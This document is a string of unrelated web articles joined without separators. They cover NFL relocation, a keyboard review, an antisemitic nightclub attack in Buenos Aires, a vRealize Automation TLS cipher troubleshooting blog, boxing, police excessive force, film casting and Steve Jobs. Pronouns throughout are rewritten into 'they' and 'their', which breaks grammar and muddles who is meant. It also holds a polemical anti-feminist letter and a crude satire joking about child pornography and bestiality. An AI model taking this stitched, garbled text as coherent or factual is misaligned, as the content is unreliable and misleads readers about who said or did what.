According to several sources informed of the team's plans, Spanos told NFL Commissioner Roger Goodell, other league officials and a few fellow owners of their intentions following the committee meetings Wednesday. During those meetings, the Chargers were barely a topic and the league did not offer any additional money to contribute to their stadium efforts.
According to those who know them well, the committee meetings were seen as the last opportunity for a solution. None came.
The Chargers are expected to formally announce their decision to move Thursday and they'll also debut a new team logo, according to sources. Spanos will then go to L.A. to meet with the mayors of Los Angeles and Inglewood.
ESPN first reported that Spanos had made a firm decision. The owner had previously said they were leaning toward Los Angeles.
Earlier on Wednesday, the league extended the Chargers' deadline to pick up the option to join the Rams in Los Angeles by a few days, making it Jan. 17. Yet it appears Spanos will make the call before that cutoff.
There is a caveat -- and it's a big one: Spanos has done nothing official. They haven't filed a formal relocation letter, hasn't informed city officials in either San Diego or Los Angeles and hasn't told their staff yet.
Two people who speak to Spanos regularly insisted they still can change their mind, though that seems unlikely. Another source pointed out how deliberate Spanos is, saying that if he's called a meeting to inform their staff, it almost certainly means their mind is made up.
One team source would not address the matter, saying the decision has changed on a daily basis. But they also are telling those close to them what might be their reality.
If the Chargers do announce firmly they are moving, they have until May 1 to terminate their lease with Qualcomm Stadium and with their training facility. They'd owe a $12 million termination fee to the city and would have to be out of Chargers Park by July 1.
Having leased a practice facility and office space in Costa Mesa, California, they would likely be out far sooner than that.
As for where in the L.A. area they might play in 2017, the expectation is the StubHub Center in Carson would be the team's temporary home until the Inglewood stadium they would share with the Rams is built.

QWERKeys are a UK based startup that originally stocked Cherry MX switches and custom key caps for mechanical keyboards. Since the overwhelming success of the customisation of mechanical keyboards (see Geekhack deskthority and reddit), QWERKeys has now expanded their product range to include their own branded keyboard dubbed the “QWERKeyboard”. What we have in to review today, is the first iteration of the QWERKeyboard, which means the model I have will be tweaked a bit for it's final release, but the main feel and look of it will remain the same. The QWERKeyboard is based on the Tex Beetle 60% keyboard, however it will be available with ISO layouts and various switch types. The current model I have in front of me has little or no obvious branding, although I have been told that some QWERKey/QWERKeyboard branding will appear. For parts of this review I may come across Tex branding, which I have had confirmed, will remain unless otherwise stated later in the review. It is apparent from the specs that the QWERKeyboard is more of a premium keyboard (taken from the Tex datasheet) and will no doubt be aimed more towards portability.
Features
USB Interface HID Device Plug & Play／Hot-Swappable Firmware upgradable over USB QWERTY Layout About 60% as wide as of the standard 104-Key keyboard Uses Cherry MX-Series switches N-key rollover Memory function users can define Multi-Lingual Layout Laser-engraved Keycaps Aluminum top case design Gold plated connector
Specification
Power consumption：USB 5V / 60 mA Dimension（W＊L＊H）：124 mm＊298 mm＊35 mm (without stand) ／124 mm＊298 mm＊46 mm (with stand) Weight：760 g USB Cable Length：1.8 meters Number of Keys： 66 Keys（English-USA/Traditional Chinese/Korean Layout）
67 Keys（Japanese/European Layout） Lifecycle of Cherry switches：50 million key presses
There is also a LED version available, although the version I have in to review is the non-backlit version, but that's enough talk, lets take a closer look.
Closer Look
The QWERKeyboard comes in a plain white box, void of any forms of branding, although this could change for the final release, with hopefully some QWERKey branding. Opening the box you are presented with the QWERKeyboard in a plastic surround with a foam cushion on the lid, which protects the keyboard well. Other than the keyboard itself, there is only a USB cable in the box, although again, this could change for the final release. EDIT: It has been confirmed that QWERKeys will also be supplying an special set of key caps for any preorders, however it is unknown which will be included. My first impressions of the QWERKeyboard, is that the build quality is fantastic. The top part of the case is machined aluminium, which has a very crisp edge, clean lines and smooth corners. The keyboard itself if fairly heavy weighing in at 737g which is quite a lot considering my full size Cherry MX Board 3.0 weighs 825g.
As you can see, the keyboard is the 60% size, which means the layout has had to be changed to compensate for the smaller size. Subsequently, there is no direct function key row or modifiers such as page up/down, insert, home etc. This mini sized keyboard does however have the arrow keys, which is not often seen on keyboards of this size. I will show you later on how the QWERKeyboard adds the function keys into the small size. The only other accessory you get with the keyboard is a USB cable (USB to mini USB), which has gold plated connectors. The cable is not braided, however it does feature a ferrite choke to reduce any interference. Due to the small nature of this particular keyboard, the function and modifier keys have been combined with others, to maintain full functionality. The function keys have been combined with the number keys, which results in you having to press an additional function key (either side of the spacebar) to activate the other key function. There are also additional keys (L1-L5), which are combined with the QWERT keys. These keys act like DIP switches, which swap various functions of the keyboard around – but more on this later. The current layout is ISO UK layout, although there are other layout options such as different European layouts (french, german, nordic etc). This particular model has Cherry MX Blue switches which are tactile and require 45g of force to actuate the key. The switches are plate mounted, meaning they are more stable then their PCB mounted equivalent, although this means the keyboard weighs more. The underside of the keyboard is relatively featureless, although the inset part in the middle is intended to be covered with a sticker, which you can see in the next photo. This sticker is not attached to keyboard as standard, so it has to be applied yourself. It displays the various options that can be controlled via the L1-L5 keys that I mentioned earlier. The sticker also features the model and serial number, alongside “Designed by TEX, Made in Taiwan” and the website address. Just like most keyboards, this one also features some feet that raise the back of the keyboard. A nice feature of the QWERKeyboard is that it has a removable USB cable, which increases the customisation options. From this angle you can see some small marks on the key caps, which are most likely from the spruce the keys would have been attached to when made. Whilst this doesn't affect the performance of the keys, it doesn't look great if you like your keyboard to look good – which most keyboard enthusiasts do. That said, it's nothing major and not visible when in use. The standard (right) key caps are made from ABS plastic and have the typical print for the labels. The key cap on the left is a QWERKey key cap, shown for comparison purposes. So that pretty much covers the aesthetics of the QWERKeyboard, now it's time to put it to the test.
The best way to review the performance of a keyboard is through many hours of use across many difference games and programs. Typically I run the tests across a week or more to best find the positive and negative aspects of the product – and not only that, sometimes, they can be quite different to what I'm used to, so it takes time for it to settle in. For the tests, I used the keyboard for gaming and general use (in fact I'm using it now to type this review), across a week to potentially discover any faults with the keyboard. Setting up the keyboard was very simple, it is just simply plug and play, with no drivers required. Gaming First up was gaming, so I played many games of my current favourite FPS – Battlefield 3, Diablo 3 and some Supreme Commander 2.
Battlefield 3 was up first and straight away I was finding the keyboard very pleasant to use, however, it is not without it's disadvantages, mainly being that to change seats in vehicles you need to press F1 through F5, which of course is made more difficult by having to press an additional Fn key to activate the key. This was a major pain and took a while to get used to. For games of less intensity, the lack of direct function keys also became a bit of an issue, although the general use for both Supreme Commander 2 and Diablo 3, with the blue switches really felt great and to some degree improved my performance, down the the tactile feedback you get from the switches.
That said, the switch type is down to preference, so you may find this experience different. General Use The main purpose of the QWERKeyboard is for typing, which makes perfect sense with the blue switches. The tactile feedback is great, although I wouldn't recommend using it in a room that you share with others as it's very loud compared to the other switch types and even rubber dome keyboards.
The lack of dedicated function keys isn't so obvious when you are typing or just using it for casual internet browsing, as there isn't the same pressure to perform well that you get whilst playing games, however the did miss the dedicated delete and home/end keys as I tend to use these keys quite a lot for when I'm typing/coding. The addition of volume +/- and mute is a nice touch and I did find myself using these fairly often.
The size of the keyboard meant I could take it on my daily commute to my place of work and use it instead of the rather old and rubbish rubber dome keyboard I have to put up with. As I already mentioned, the keyboard is quite heavy, although the build quality and durability of the keyboard meant I could just chuck it into my bag and take it around with me. So that pretty much sums up the performance of the keyboard, now it's time to conclude the review.
Final Thoughts
I'd like to start the conclusion off with a reminder that the QWERKeyboard I was supplied with for this review, is currently still in the beta stage of development so much could change in terms of aesthetics, however performance should remain the same. The QWERKeyboard's 60% size is ideal for anyone who likes to take their keyboard around with them, whether to work, college or even LAN events.
The look of the keyboard is very appealing and the aluminium case looks great and gives it a solid premium characteristic. Typing and gaming on the keyboard was also a pleasure, however this is subjective as I favour blue switches over the others – so you may find this different to how I did. The keyboard is not without it's flaws however, as when you are gaming the lack of dedicated function keys does mean you are one step behind on your enemies, though with practise this could be reduced.
Whilst the QWERKeyboard is perfect for travelling with, due to it's design and build quality it does weigh a fair bit, although this is often a sign of good quality. The price is also a potential problem with this keyboard as it'll set you back around £100 – which would get you a decent full sized keyboard.
Overall the QWERKeyboard is superb for anyone who is after a great looking , well performing and portable keyboard. If you are willing to pay a premium for aesthetics and it's portability and don't mind making a compromise for the lack of dedicated function keys, then this could be a worthy contender. Sure this could be seen as nothing but a rebranded Tex Beetle, but currently these are very difficult (and even more expensive) to source in Europe, so availability combined with the great support I've experienced with QWERKeys, makes this particular iteration stand over the rest.
Whilst I'm very eager to give this keyboard the best award possible, I'll hold back until the final version is available, so for these reasons I'm not going to award it with the editor's choice, but since the QWERKeyboard is so well designed I am awarding it with the:
Jewish students from the ORT High School in Buenos Aires, Argentinaת were attacked in a nightclub by other students dressed as Nazis according to Spanish-language media.
Follow Ynetnews on Facebook and Twitter
The attackers were from a German school in the Buenos Aires neighborhood of Lanus, according Argentine news website La Nación.
The attack occurred at the Cerebro de Bariloche night club. One of the mothers of the children who were attacked recounted the episode to Rádio Latina, saying "at a certain point in the night, young people came wearing swastikas and had painted-on Hitler mustaches."

"My son and their friends complained and asked that they be taken out, but all the club management did was demand that the mustaches be washed off and that the swastikas be removed," they continued.
"They all ended up fighting, and everyone was kicked out of the club – not just the aggressors," they said.
The families have condemned the club, saying that the club management should never have let the students dressed as Nazis into the club in the first place.
However, the mother did say that they appreciated that non-Jewish students who were at the club came to the Jewish students' defense. Gustavo Genusso, manager of the Bariloche club, said to TN News Station that the fight was a "worrying development" and that the students from the German high school were "no longer allowed in the clubs."
Meanwhile, the head of the Delegation of Argentine Jewish Associations, Ariel Cohen Sabban, said that they would meet with the club's manager.
"It's neither a joke nor a grace," Sabban said. "these symbols reflect an ideology which culminated in the assassination of six million Jews at the hands of the Nazis. If these kids are older than 16, then these kids could be sentenced to between a month to three years in prison for their actions, as this is a crime in Argentina."
Sabban finished by saying, "we have to be alert because we are beginning new hot beds of anti-Semitism which...But the state's drive to combat this phenomenon, specifically through education, is very important."
I worked recently with a customer to fix a problem during a vRealize Automation 7.2 PoC installation. I need to say that I've never installed a vRA Appliance PoC before so I didn't know how parts working together. During the installation wizard process we encounter the following error message where the installer tried to configure the WEB component:
Trusted connectivity validation failed for address “https://vra01.ad.vbrain.info/“: The request was aborted: Could not create SSL/TLS secure channel.
Failed to execute validation. Error: The request was aborted: Could not create SSL/TLS secure channel.
Issue 1:
From the error message I assumed that it had something to do with certificates. So we checked the certificate of the WEB service (created during Installation wizard) and the VAMI service (created during OVA deployment) the vRA Appliance is using. It pointed out that the certificate of the VAMI service looked like this:
FQDN.DOMAINNAME e.g. vra01.ad.vbrain.info.ad.vbrain.info
During the OVA deployment you need to enter a FQDN or IP address for the appliance hostname and a domain name. I think the process which is creating the VAMI certificate is somehow wrong because it's using the FQDN and the domain name to create the certificate.
My recommendation for future deployments will be to use only the hostname instead the FQDN to avoid this problem.
We tried really hard to replace this certificate which we thought could be the problem. We used the certificate which was generated for the WEB service. After that the IAAS agent couldn't contact the vRA Appliance any more. So we decided to install the Agent again. During the installation I saw that it needs a fingerprint of the certificate used by the vRA VAMI. Now I know why the connection didn't work anymore. The reason for this was because we change the certificate and with the certificate came also a new fingerprint. But after changing the certificate and working on this issue for some hours we decided to step back to the last snapshot and start from “scratch”. I also got the information from a friend that in their lab this certificate looks like the same and there they had no issues. That was the final hint we need to move away from this theory.
Issue 2:
We still didn't know from where the problem was coming but we missed something in the initial error message. We assumed that the VAMI certificate could be the problem but reading the error message once more we saw that the VAMI port 5480 wasn't mentioned.
We connected through RDP to our IAAS Windows VM, opened an Internet Explorer windows and entered https://vra01.ad.vbrain.info to see which certificate comes back. To our surprise we got the following error message from IE:
This Page can't be displayed Turn on TLS 1.0, TLS 1.1, and TLS 1.2 in Advanced settings and try connecting to https://vRAApplianceServerName again. If this error persists, it is possible that this site uses an unsupported protocol or cipher suite such as RC4 (link for the details), which is not considered secure. Please contact your site administrator.
This was now very weird because we also checked the VAMI interface and there we didn't get this message. I checked both used certificates for VAMI and the vRA interface with the following command:
openssl s_client -connect vra01.ad.vbrain.info:5480 and openssl s_client -connect vra01.ad.vbrain.info:443
Here are the differences:
VAMI Certificate
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
Protocol : TLSv1.2
Cipher : ECDHE-RSA-AES256-GCM-SHA384
vRA Certificate
New, TLSv1/SSLv3, Cipher is AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
Protocol : TLSv1.2
Cipher : AES256-SHA
As you can see both certificates are using a different cipher. After we found out that the cipher is different the customer gave me the decisive hint. They told me that the security department has implemented a new GPO for new Windows Servers which should only allow a subset of available ciphers. The reason for that was to eliminate the POODLE vulnerability. In addition the security department defined the following certificate requirements:
Protocol TLS 1.2 (TLS 1.0 and TLS 1.1 for specific Applications)
Cipher AES 128/128 and AES 256/256
Hashes SHA, SHA256, SHA384, SHA512
Keys Diffie-Hellman and ECDH
The ciphers allowed on the IaaS server we were using were:
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P521
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P521
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P384
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P521
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P384
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P256
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P521
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P384
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P256
You can find the information in the following registry key:
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Cryptography\Configuration\SSL\00010002
When I added in my test environment the TLS_RSA_WITH_AES_256_CBC_SHA cipher to the existing ones I had no problem accessing the website.
In addition there where also the following settings made in the registry:
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers enable (REG-DWORD 0xffffffff, decimal 4294967295) AES 128/128 AES 256/256 disable (REG-DWORD 0x00000000, decimal 0) NULL DES 56/56 RC2 128/128 RC2 40/128 RC2 56/128 RC4 128/128 RC4 40/128 RC4 56/128 RC4 64/128 Triple DES 168
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes enable (REG-DWORD 0xffffffff, decimal 4294967295) SHA SHA256 SHA384 SHA512 disable (REG-DWORD 0x00000000, decimal 0) MD5
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms enable (REG-DWORD 0xffffffff, decimal 4294967295) Diffie-Hellman ECDH disable (REG-DWORD 0x00000000, decimal 0) PKCS
When removing the cipher limit registry key only the disabled PKCS registry key led to the same behaviour as the used GPO. When removing the key as well everything works fine.
Conclusion
It looks like that the vRA 7.x appliance generates different self-signed certificates with different ciphers. In a normal environment with no cipher restriction this is not a problem. Only when a customer restricts the available ciphers because of security issues this could lead to a problem. Also the wrong generated VAMI certificate is something that need to be fixed and I will hand this over to our vRA team. To be clear, this is NOT a big issue for two reasons:
Hopefully you always use your own PKI to create certificates for your production environments. And with that you have defined your certificate requirements. Even if you run into this issue during a test or PoC installation, you can still replace the self-signed certificates with ones only dedicated to the PoC.
Finally a big thank you to Wolfgang and Herbert who helped me through this troubleshooting.
The ancient city of Uruk. YouTube/Barbara Leticia
Cities have played a crucial role in human development for more than 9,000 years.
From Jericho, the oldest known city in the world, to Tokyo, the largest city today, cities have served as centers for commerce, technology, education, and culture.
And cities are continuing to grow to new heights. In 1960, there were two rural dwellers for every city dweller in the world. But as the biggest wave of urbanization in human history continues, more than half of the world's population now lives in urban centers.
We looked at data spanning thousands of years to compile this list of the greatest cities of all time. Although determining the exact population of ancient cities is no easy task, we used research from historians Tertius Chandler and Gerald Fox in their book "3,000 Years of Urban Growth" and political scientist George Modelski's 2003 book "World Cities, -3,000 to 2,000."
The numbers were drawn from the size of a city's military in peacetime and in war, household data, agricultural commerce, church records, fortification sizes, food distribution, loss of life in a disaster, and city comparisons.
Read on to see the 16 greatest cities in human history:
Cleverly v Bellew II: James DeGale hopes for a rematch of their own against George Groves
James DeGale: Waiting for Carl Froch to make decision about possible fight
James DeGale could switch their attention to a rematch against George Groves if they defeat Marco Antonio Periban.
The Harlesden fighter is mandatory challenger for Carl Froch's IBF super-middleweight title, but is being forced to wait for the champion to make a decision about their future.
DeGale can keep themselves in the spotlight with a win over Periban this Saturday, live on Sky Sports Box Office, and has urged Froch to either face them or vacate their title.
If the fight against the Nottingham man fails to materialise, then the Londoner is keen to renew their rivalry with Groves, who defeated them on points in 2011.
If Carl Froch is there, he's there, but time is running out for him. They have to make their mind up by the end of December. James DeGale
“Yeah, obviously I would like to box Carl Froch, but I'm not chasing Carl Froch,” they told Sky Sports News HQ. “I'm chasing my dream - and that's to become world champion.
“If Carl Froch is there, he's there, but time is running out for him. They have to make their mind up by the end of December.
“If not, they get stripped so if he's there I have to box them - brilliant it will be a massive fight and I will beat Carl Froch. If I have to box for a vacant title or against next in line, let it be, whatever.
Public interest
DeGale's feud with Groves dates back to their amateur days and they continue to be linked, despite forging successful careers of their own in the professional ranks.
The 28-year-old former European champion is happy to hear their former opponent's name because they believe a second fight would create huge public interest.
“It doesn't annoy me because it's healthy to have a rivalry in boxing, they said. "You've got to have that and I'm lucky in that I've got somebody I dislike and they dislike me and we've got history.
James DeGale says they are expecting a tough test when they face Marco Antonio Periban James DeGale says they are expecting a tough test when they face Marco Antonio Periban
“It goes back. Me and Groves isn't like Cleverly and Bellew - or other rivalries out there - because this is deep, this goes back. When one of us has a world title or both of us have world titles, that would be a massive fight, a huge fight - and I'm willing to take that when he's ready.
"That's a dream fight, a big, big possibility. I'm a mandatory challenger for the IBF world title, he's a mandatory challenger for the WBC.
“If that happens in the early part of next year, we can have a massive stadium fight next year and it could be bigger than Froch-Groves II. You never know.
“I'm just concentrating on Saturday, Marco Antonio Periban. I'm going to deal with them and we'll see after that.”

Dear Yvette,
It was with a heavy heart that I read your article in the Independent. Writing about abuse in schools, you headline your piece “Why We Must Educate Our Sons to Save Our Daughters” and continue it with the most flagrant disregard for the truth that I think I have recently encountered.
You write of the hurling of insults and the way in which teachers are concerned for the well being of girls and you use as your evidence this:
According to the Children's Commissioner there is clear evidence that violence in young relationships is growing. The British Crime Survey shows girls aged between 16-19, are most at risk of domestic violence – over 10 per cent had been experienced violence or abuse in a relationship.
Examining the evidence that you seek to rely on to convince us of this, however, it is clear that violence in the world at large, in the family, in the home and at school, is almost equally likely to affect boys as well as girls. In fact men are more likely than women to experience violence per se and almost as likely to experience domestic violence. Don't believe me? Here is the evidence from the source you quote, the British Crime Survey.
The CSEW showed that young men were most likely to be the victims of violence. The profile of victims of violent and sexual violence varied according to the type of offence. In 2011/12, as in previous years, more than two-thirds of homicide victims (68%) were male. In contrast, women Focus on: Violent Crime and Sexual Offences, 2011/12 | 07 February 2013 Office for National Statistics | 2 were more likely to be a victim of domestic abuse. Some 7% of women and 5% of men were estimated to have experienced domestic abuse in the last year, equivalent to an estimated 1.2 million female and 800,000 male victims.
Whilst you can of course point to the 2% difference in the rate of experience of domestic violence as being evidence that more women than men suffer, it seems to me to be utterly disengenous to simply dismiss 800,000 incidents of domestic violence against men as being either of no consequence or no proof that violence is something that is suffered by men AND women and enacted by men AND women. And yet in your speech this week you consistently and deliberately maintained the illusion that only women and girls suffer violence and only men and boys are to blame.
It is simply untrue. Violence, in the home and in the world around is not a gender issue. Though it is the fervent goal of feminism to convince us that it is.
Our failure to understand this and our belief in what feminists tell us, leads us to witness the creeping emasculation of our boys which, if you have your way, will enter their consciousness in the early days of their education, in the form of your proposal to turn boys into “confident feminists.”
I don't think I can properly express how I feel about your proposals, to bring in new laws to safeguard women and girls, which are based upon lies, stereotypes and the self interested proclamations of young women who consider themselves to be ‘oppressed.' In your piece you quote the organisations who you feel should be supported by your party and the way in which these are leading the way to freedom for women and girls. You end your list of these with the movement 1 billion rising, the brain child of Eve Ensler, the author of the Vagina Monologues and the infamous scribe of the scene in which a young girl of 13 is raped by an older woman, ended with the words “if that was rape, it was a good rape.” And you proclaim that these are the inspiration behind your proposals that boys are educated out of their inherent masculinity.' I could not feel more sickened.
In my view, the Labour party in the United Kingdom and all of its supporters should know the truth of the matter which is that feminism is a political doctrine which teaches not equality, but that the rights of women must come first, last and always. As part of that process, the emasculation of men and boys is seen as a desirable outcome.
Making boys into girls starts early in their childhood these days, with primary education being more likely to be taught by women and good behaviour in children being seen as that which is displayed by girls, whilst dysfunctional behaviour is more likely to be viewed in boys. The notion that boys and girls are different but equal in their value, in their learning capacity, in their behaviour and in their general demeanor appears to have simply been erased by the idea that, in the words of Glen Poole from Equality4Men, girls HAVE problems and boys ARE problems. This narrative, which is evident in your behaviour Yvette Cooper, is shaped by women who have control over family policy and and who see the needs and rights of children as being indivisible from those of their mothers.
But the rights and needs of children are NOT indivisible from those of their mothers. The rights of boys are equal to those of girls and it is not for feminists to determine what makes a ‘good boy' or a ‘good girl' either for that matter. Feminism is not synonymous with equality, much as the feminists would have us believe that it is so and it does not and cannot solve the problems of the world in which we are raising our children and grandchildren.
A world in which the following is true (Taken from the Equality4Men website):
Men and boys in 99% of countries are more likely to kill themselves than women and girls
Men and boys account for 4 out of 5 violent deaths in the world ever year
Girls in nearly 100 of the world's leading economies are more likely to get a better education and go to university than boys
Fathers all over the globe are less involved in raising their children than mothers for all sorts of personal, cultural and political reasons
…which is just a snapshot of the reality that we face in terms of helping boys to grow to be healthy and happy people. How does your proposal, to turn boys into ‘confident feminists' offer us any kind of road map for the health and wellbeing of boys as well as girls? Put simply it doesn't. What it does is lie to the electorate about the reality facing our children and prey upon the anxieties whipped up by half hysterical women who believe that dancing around the world proclaiming their oppression is somehow about equality. Pity our boys, because what is being done to them prevents their ability to believe in their own inherent sense of self, prevents their ability to trust themselves and others in the world around them and inculcates shame at the earliest age about what it means to be not a girl.
The facts speak for themselves. Your closing words speak only for you and those like you –
For years we have talked about the importance of empowering our daughters, giving them the confidence to challenge abuse and bringing them up as feminists. If we are going to achieve a real-step change in tackling violence against women, we need our sons growing up as confident feminists too.
Women like you have created a world in which educating boys to be ashamed of their masculinity is seen as desirable instead of cruel, and about equality instead of what it is: An oppressive, discriminatory reality.
As parents and grandparents, practitioners and ordinary people, we will hold you to account for your crimes against our children and our grandchildren. I hope I stay alive long enough to see the day.
Video released Wednesday provides the first public glimpse of a violent encounter last fall between a Boyes Hot Springs man and a Sonoma County sheriff's deputy, who was later charged with beating the man as they lay in their own bed.
The 68-second cellphone video was taken by Fernando Del Valle, 38, the night of Sept. 24 after neighbors summoned deputies to their Highland Boulevard home on reports the Marine Corps veteran was arguing with their wife.
It opens as Del Valle talks to two deputies who are alleged to have broken down their bedroom door and are ordering them to stand up.
Del Valle refuses, instead training their camera on them and warning, “I got you on video. Go ahead. Tase me.”
Within seconds, former Deputy Scott Thorne, 40, steps forward and fires their stun gun at Del Valle, hitting them on their bare chest.
Del Valle can be heard screaming and the camera angle shifts around the room and toward the bed as they squirm and begins to suffer what their lawyer said were numerous baton blows from Thorne. The sounds of the strikes are captured on the audio track.
Toward the end of the video, Del Valle's wife can be heard calling out to them and telling deputies, “He's not doing anything.” Del Valle instructs them to take their phone and give it to their lawyer.
The video goes black as they shout repeatedly, “Call my lawyer!”
Del Valle was taken to jail but cleared of any charges after prosecutors reviewed body camera recordings made by Thorne and two other deputies at the scene.
Thorne, who a Press Democrat investigation revealed had a track record of excessive force complaints in previous jobs, was fired. They were charged with felony assault by a law officer and is awaiting trial in late June.
The other deputies, Anthony Diehm and Beau Zastrow, were not charged.
Del Valle's lawyer, Izaak Schwaiger, said the cellphone video provides a partial yet critical view of what happened. Combined with the body cam recordings, they said “there is no question about what happened here.”
“I think it speaks volumes.”
A spokesperson for Sheriff Steve Freitas could not comment on the cellphone video but agreed the deputies' three videos raised concerns from the start about excessive force. After watching them, department brass immediately turned the case over to Santa Rosa police for criminal investigation, Sgt. Spencer Crum said.
“We acted very swiftly and Scott Thorne was no longer employed by us,” Crum said. “We are very concerned this is an excessive force case. We acknowledged it from Day One.”
The Sheriff's Office declined Wednesday to release the deputies' videos.
The release of Del Valle's video followed by several weeks their filing of a civil claim for damages with Sonoma County government. The forms seek an unspecified amount over $25,000 that is expected to be several million dollars. A formal lawsuit would likely follow if a settlement is not reached.
Thorne has argued all along they acted in compliance with their training and Del Valle presented a risk to him, said their lawyer, Chris Andrian.
Marvel boss Kevin Feige confirmed that Benedict Cumberbatch (Star Trek: Into Darkness, The Imitation Game) will start filming for "Doctor Strange" this November.
According to Comic Book Movie, Feige confirmed the news during a press event for blogger, saying that they were "excited" about Cumberbatch's portrayal of the Sorcerer Supreme.
The film will be led director by Scott Derrickson (Sinister), working with a script from Jon Spaihts (Prometheus).
Creators Stan Lee and Steve Ditko introduced Doctor Stephen Vincent Strange in the comic book Strange Tales #110 in 1963.
According to an official statement, the film will be firmly based on the comic book's storyline. Stephen Strange is a successful but arrogant neurosurgeon who loses their talents in a car accident. Suffering from their loss, they are taken under the wing of a mystic wizard and is given special powers to defend the world from dark forces.
Previous casting choices included Jack Huston (American Hustle), Johnnny Depp (Mortdecai), and Keanu Reeves (John Wick). Actor Joaquin Phoenix was one of the top contenders to play the role, reportedly having reached early negotations with Marvel. The "Walk The Line" star declined the offer, opting to work with small productions instead.
Cumberbatch's casting was officially announced late in 2014.
"Stephen Strange's story requires an actor capable of great depth and sincerity... In 2016, Benedict will show audiences what makes Doctor Strange such a unique and compelling character." - Feige said in a statement from last year on Screen Rant.
It will also feature co-stars Chiwetel Ejiofor (12 Years A Slave) as sorcerer Brother Voodoo, Simon Baker (The Mentalist) as Baron Mordo, and Juliet Ryalance (Sinister) as the film's lead lady, Clea.
the character is expected to join the rest of the Earth's mightiest in the "Avengers: Infinity War" movies.
"Doctor Strange" is scheduled to film at the Pinewood-Shepperton Studios. After their solo film, the character is expected to join the rest of the Earth's mightiest in the "Avengers: Infinity War" movies.
The movie releases in theaters on Nov. 4, 2016.
Sen. Joe Manchin III, a pro-gun West Virginia Democrat and member of the National Rifle Association, said Monday that “we need action” in the wake of the shootings in Newtown, Conn., and offered praise for Sen. Dianne Feinstein, California Democrat, who has pledged to introduce a bill to reinstate a ban on assault weapons.
Mr. Manchin, perhaps best known for literally shooting a bullet through President Obama's cap-and-trade energy bill during their 2010 campaign, said on MSNBC's “Morning Joe” that “every child should have a safe place in their life” in the wake of the Connecticut shootings last week that claimed the lives of six adults and 20 children.

“I think in West Virginia, all our hearts go out to every parent, every affected family,” Mr. Manchin said. “But the bottom line is absolutely we've got to — we've got to sit down. I ask all my friends in NRA — and I'm a proud NRA member and always have been — that we need to sit down and move this dialogue to a sensible, reasonable approach to fixing — it's part of it, not all of it. But everything has to be on the table, and I think it will be.”
Mr. Manchin, noting that they had just come from deer hunting with their family and that he's never had more than three shells in a clip, said having a conversation about preventing future tragedies and protecting the Second Amendment rights of Americans are not mutually exclusive.
“I'm telling you, I believe this is the time for all of us to sit down and move in a responsible manner, and I think they will,” they said. “And I think when you look at it, if Dianne's saying that, basically, assault weapons — I don't know anyone in the sporting or hunting arena that goes out with an assault rifle. I don't know anybody that needs 30 rounds in a clip to go hunting. I mean, these are things that need to be talked about.”

It is no news that Lego was created by evil Denmarkians as a way to introduce porn to innocent children:But Lego decided that even child porn wasn't evil enough for them. Something much worse was needed to achieve their goal of preventing every child on the planet from going to Heaven by sending them straight to Hell . To achieve this goal, Lego has now introduced board games so horrible, so evil, that I have to advice all those with a weak stomach to stop reading! Please excuse me while I puke in anticipation of what I am going to write down here.Disguised as a Christian game based on creationism, this game specifically targets Christian families. When you look closer though, you will see that the female on the left is dressed as a whore. Also it has both a tractor and a dinosaur while every Christian child knows these never coexisted as all dinosaurs died in the great flood God created to kill all humans but a few for pissing Him off. The only thing honest about this game is the warning on the box that people might choke on their own vomit while playing this game.For some reason this game is very popular in New Zealand . Aimed at 5 year old children (!) this game has one repulsive goal. Teaching innocent children that bestiality by raping sheep is a good thing!All True Christians™ know the make believe world of Harry Potter is driving children to the edge of insanity! And who could forget that those subliminal messages in Harry Potter movies turn girls into harlots ! But no, as if we burned all those Harry Potter books for nothing, Lego creates a Harry Potter board game! The goal of the game is to create Hogwards and then to reenact the gay sex scene edited out of final Harry Potter book!Designed by True Pastafarian™ Jo Freddie himself, this game teaches children God is a silly Flying Spaghetti Monster. This horrible horrible game also teaches children to steal money from innocent large American corporations instead of working for these corporations until they get a well deserved heart attack after which they will go to Heaven.
Steve Jobs was a true obsessive. They pored over every tiny detail of every product, every ad, every store, every thing related to Apple.
Their attention to detail and craft apparently came from their father who told them it was important to craft the backs of fences and cabinets even though they would never be seen. Jobs told their biographer Walter Isaacson, "He loved doing things right. They even cared about the look of the parts you couldn't see."
While that's an important lesson to learn, Jobs may have taken it a little too far. The Jobs biography is loaded with examples of Jobs zeroing in on even the most insignificant detail just to get things right.
For instance, when Apple was starting to open new retail stores, their ad partner Lee Clow said, "Steve made us spend a half hour deciding what hue of gray the restroom signs should be." It's good to get the color right, but there's no reason to take a half hour agonizing over such a small detail. Pick a nice shade of gray, move on.
Of course, that's why they were Steve Jobs and we're not. Here are a few more examples of their attention to detail.
They "agonized" over the way the title bars at the top of files and windows looked
They wanted the bars to have pinstripes. Bill Atkinson, one of the main Mac developers, said, "We must have gone through twenty different title bar designs before they were happy." Eventually Atkinson and another employee complained about wasting time on endless small tweaks.
Jobs freaked out on them, shouting, "Can you imagine looking at that every day? It's not just a little thing, it's something we have to do right."
They insisted on making the circuit board inside the Mac look great
Nobody but Apple's engineers would know what the printed circuit board inside the Mac would look like, but Jobs was critiquing it based on how it looked.
